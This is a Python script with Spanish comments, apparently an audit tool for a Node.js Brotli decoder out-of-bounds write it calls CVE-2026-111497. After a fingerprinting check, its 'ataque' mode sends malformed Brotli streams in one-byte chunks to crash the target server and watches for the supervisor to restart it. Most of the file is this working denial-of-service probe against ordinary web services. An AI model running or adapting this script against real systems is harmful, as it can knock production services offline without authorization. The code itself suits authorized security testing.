#!/usr/bin/env python3
"""Auditoría Node2Shell (CVE-2026-111497): OOB write en el decodificador
Brotli embebido en Node.js (< 22.23.4 / 24.22.1 / 26.12.1).

Dos pasos explícitos:
  comprobacion — sin impacto: ¿el endpoint decodifica Content-Encoding: br?
  ataque       — streams Brotli malformados por trozos diminutos (el bug
                 vive en el decodificador EN STREAMING) buscando un crash
                 observable: la sonda tumba el servicio y el supervisor
                 (systemd/pm2) lo resucita ante nuestros ojos.

El RCE no se afirma: sin PoC público de grooming de heap, un crash
observable afirma «primitiva de corrupción reproducible», no shell.
"""
import argparse
import socket
import ssl
import sys
import time
import urllib.parse
import urllib.request

try:
    import brotli
except ImportError:
    brotli = None

CUERPO = b"nombre=auditoria&email=auditoria@example.com"
MAX_SONDAS = 12          # techo duro de peticiones del ataque
PAUSA = 2.0              # segundos entre sondas
VENTANA_REBOOT = 60      # segundos esperando ver volver al servicio


def _req(url, cuerpo, headers, timeout=10):
    """POST devolviendo (codigo_http | 'RESET' | 'TIMEOUT')."""
    peticion = urllib.request.Request(url, data=cuerpo, headers=headers,
                                      method="POST")
    try:
        with urllib.request.urlopen(peticion, timeout=timeout) as r:
            r.read(2048)
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except (ConnectionResetError, ConnectionAbortedError,
            http.client.RemoteDisconnected, BrokenPipeError):
        return "RESET"
    except socket.timeout:
        return "TIMEOUT"
    except ssl.SSLError:
        return "SSLERR"
    except OSError:
        return "RESET"


import http.client  # noqa: E402  (necesario para RemoteDisconnected arriba)


def _post_br(url, stream, trozo=None):
    """POST con Content-Encoding: br; trozo=N manda el cuerpo en chunked
    de N bytes (estresa el camino de decodificado en streaming)."""
    if trozo is None:
        return _req(url, stream, {"Content-Type": "application/x-www-"
                                  "form-urlencoded", "Content-Encoding": "br",
                                  "Content-Length": str(len(stream))})
    # chunked a mano: urllib no hace chunked con cuerpo incremental fácil
    u = urllib.parse.urlparse(url)
    puerto = u.port or (443 if u.scheme == "https" else 80)
    try:
        if u.scheme == "https":
            conn = http.client.HTTPSConnection(u.hostname, puerto, timeout=10)
        else:
            conn = http.client.HTTPConnection(u.hostname, puerto, timeout=10)
        conn.putrequest("POST", u.path or "/")
        conn.putheader("Content-Type", "application/x-www-form-urlencoded")
        conn.putheader("Content-Encoding", "br")
        conn.putheader("Transfer-Encoding", "chunked")
        conn.endheaders()
        for i in range(0, len(stream), trozo):
            pedazo = stream[i:i + trozo]
            conn.send(b"%x\r\n%s\r\n" % (len(pedazo), pedazo))
        conn.send(b"0\r\n\r\n")
        r = conn.getresponse()
        r.read(2048)
        conn.close()
        return r.status
    except (ConnectionResetError, ConnectionAbortedError,
            http.client.RemoteDisconnected, BrokenPipeError, OSError):
        return "RESET"
    except socket.timeout:
        return "TIMEOUT"
    except ssl.SSLError:
        return "SSLERR"


def _plano(url):
    return _req(url, CUERPO, {"Content-Type": "application/x-www-"
                              "form-urlencoded",
                              "Content-Length": str(len(CUERPO))})


def _fingerprint(url):
    """GET raiz: cabeceras que delatan Node/Express."""
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            powered = r.headers.get("X-Powered-By", "")
            ct = r.headers.get("Content-Type", "")
            return r.status, powered, ct
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get("X-Powered-By", ""), \
            e.headers.get("Content-Type", "")
    except Exception as e:
        return None, "", str(e)


def _valido():
    return brotli.compress(CUERPO)


def _malformados():
    """5 mutaciones deterministas y documentadas sobre un stream brotli
    REAL (no invencion de bytes): truncamientos al 10/50/90%, flip del
    ultimo byte (bits ISLAST/WBITS del cabecera) e insercion fija de
    0xff tras la cabecera. Se entregan en trozos de 1 byte para forzar
    el decodificador EN STREAMING, que es donde vive el bug."""
    import hashlib
    v = _valido()
    muts = [
        ("truncado-10pct", v[:max(1, len(v) // 10)]),
        ("truncado-50pct", v[:len(v) // 2]),
        ("truncado-90pct", v[:len(v) * 9 // 10]),
        ("flip-ultimo-byte", v[:-1] + bytes([v[-1] ^ 0xFF])),
        ("insercion-ff-offset2", v[:2] + b"\xff" + v[2:]),
    ]
    out = []
    for nombre, s in muts:
        h = hashlib.sha256(s).hexdigest()[:12]
        out.append((f"{nombre}#{h}", s, 1))
    return out


def comprobacion(url, seco):
    if seco:
        print("Plan: GET de huella + POST plano + POST brotli valido al "
              "endpoint; compara codigos para ver si decodifica br "
              "(sin impacto en el objetivo)")
        return 0
    if brotli is None:
        print("Error: falta el modulo python 'brotli' (pip install brotli)",
              file=sys.stderr)
        return 2
    estado, powered, ct = _fingerprint(url)
    if estado is None:
        print(f"SERVICIO_NO_RESPONDE en {url} ({ct})")
        return 3
    print(f"[i] huella: HTTP {estado} X-Powered-By={powered or '(ninguna)'} "
          f"Content-Type={ct}")
    base = _plano(url)
    print(f"[i] POST plano -> {base}")
    br = _post_br(url, _valido())
    print(f"[i] POST brotli valido -> {br}")
    trivial = _post_br(url, brotli.compress(b""))
    print(f"[i] POST brotli trivial -> {trivial}")
    if br in ("RESET", "TIMEOUT") or trivial in ("RESET", "TIMEOUT"):
        print("fase: comprobacion — VEREDICTO: EL_POST_BROTLI_TUMBO_EL_"
              "SERVICIO — ya es evidencia fuerte; pasa a 'ataque' para "
              "reproducirlo y confirmar con monitor de reinicio")
        return 0
    if isinstance(br, str) or isinstance(trivial, str):
        print("fase: comprobacion — INCONCLUSIVE: fallo de red no "
              "clasificable (no asumir negativo por timeout)")
        return 3
    if br // 100 == base // 100 if isinstance(base, int) else br < 500:
        print("fase: comprobacion — VEREDICTO: EXPUESTO_A_BROTLI — el "
              "endpoint acepta y processa Content-Encoding: br (via de "
              "llegada de CVE-2026-111497). Ejecuta 'ataque' para la "
              "primitiva.")
        return 0
    print("fase: comprobacion — VEREDICTO: NO_DECODIFICA_BROTLI — el "
          "endpoint rechaza Content-Encoding: br; no expuesto por la via "
          "de cuerpo de peticion (queda la via fetch(), no testeable "
          "desde fuera)")
    return 1


def _monitor_reboot(url):
    """Tras perder el servicio: sondeo cada 5 s (timeout 3 s) hasta 60 s.
    Devuelve segundos hasta revivir o None."""
    t0 = time.time()
    while time.time() - t0 < VENTANA_REBOOT:
        time.sleep(5)
        u = urllib.parse.urlparse(url)
        base = f"{u.scheme}://{u.netloc}/"
        try:
            with urllib.request.urlopen(base, timeout=3) as rr:
                rr.read(512)
        except urllib.error.HTTPError:
            pass          # cualquier respuesta HTTP = proceso vivo
        except Exception:
            continue
        return round(time.time() - t0)
    return None


def ataque(url, seco):
    if seco:
        print(f"Plan: baseline de 2 POSTs validos, hasta {MAX_SONDAS} POSTs "
              f"brotli malformados en trozos de 1 byte con {PAUSA}s de pausa "
              f"y chequeos de salud entre sondas; si una sonda tumba el "
              f"servicio, vigilar su resurreccion hasta {VENTANA_REBOOT}s "
              "(puede haber caida breve del servicio propio)")
        return 0
    if brotli is None:
        print("Error: falta el modulo python 'brotli'", file=sys.stderr)
        return 2
    b1, b2 = _plano(url), _plano(url)
    if b1 in ("RESET", "TIMEOUT") and b2 in ("RESET", "TIMEOUT"):
        print(f"fase: ataque — SERVICIO_YA_CAIDO_ANTES_DE_LA_SONDA "
              f"(baseline {b1}/{b2}): resultado no atribuible")
        return 3
    print(f"[i] baseline: {b1} / {b2}")
    sondas = 0
    app_errors = 0
    for nombre, stream, trozo in _malformados():
        for repeticion in (1, 2):
            if sondas >= MAX_SONDAS:
                break
            sondas += 1
            r = _post_br(url, stream, trozo)
            print(f"[i] sonda {sondas} «{nombre}» x{repeticion} -> {r}")
            if r in ("RESET", "TIMEOUT", "SSLERR"):
                salud = _plano(url)
                if salud in ("RESET", "TIMEOUT"):
                    print(f"[i] salud tras la sonda: {salud} — monitor de "
                          f"reinicio cada 5 s hasta {VENTANA_REBOOT} s...")
                    revive = _monitor_reboot(url)
                    if revive is not None:
                        clase = ("RESTART_RAPIDO" if revive <= 15 else
                                 "RESTART_LENTO")
                        print(f"fase: ataque — VEREDICTO: CRASH_CONFIRMED "
                              f"({clase}, revivio a los {revive} s) — la "
                              f"sonda «{nombre}» tumbó el proceso y el "
                              "supervisor lo resucitó: primitiva de "
                              "corrupción de memoria reproducible "
                              "(CVE-2026-111497). El RCE exige grooming "
                              "de heap no publicado.")
                        return 0
                    print("fase: ataque — VEREDICTO: INCONCLUSIVE "
                          "(NO_RECUPERADO en 60 s): no se puede atribuir "
                          "el crash; revisa el supervisor antes de "
                          "concluir")
                    return 3
                print("[i] el servicio aguanto (salud OK tras reset de la "
                      "conexion): el reset puede ser del parser, no del "
                      "proceso")
            else:
                app_errors += 1
            time.sleep(PAUSA)
    if app_errors == sondas:
        print("fase: ataque — VEREDICTO: APP_ERROR — el proceso respondio "
              "a todas las sondas (aunque sea con 4xx/5xx): no hay "
              "evidencia de caida de proceso")
        return 1
    print("fase: ataque — VEREDICTO: PRIMITIVA_NO_OBSERVADA — el servicio "
          "proceso las sondas sin caer (puede estar parcheado, no "
          "decodificar en streaming, o que el crash necesite el stream "
          "exacto del PoC)")
    return 1


def main(argv=None):
    ap = argparse.ArgumentParser(prog="extras_node.py")
    sub = ap.add_subparsers(dest="modo", required=True)
    n = sub.add_parser("node2shell")
    n.add_argument("--url", required=True,
                   help="endpoint que procesa cuerpos (ej. https://x:3000/"
                        "submit-form)")
    n.add_argument("--accion", choices=["comprobacion", "ataque"],
                   default="comprobacion")
    n.add_argument("--dry-run", action="store_true")
    a = ap.parse_args(argv)
    if not a.url.startswith(("http://", "https://")):
        print("Error: --url debe empezar por http(s)://", file=sys.stderr)
        return 2
    try:
        if a.accion == "ataque":
            return ataque(a.url, a.dry_run)
        return comprobacion(a.url, a.dry_run)
    except KeyboardInterrupt:
        print("\n[interrumpido]", file=sys.stderr)
        return 3


if __name__ == "__main__":
    sys.exit(main())
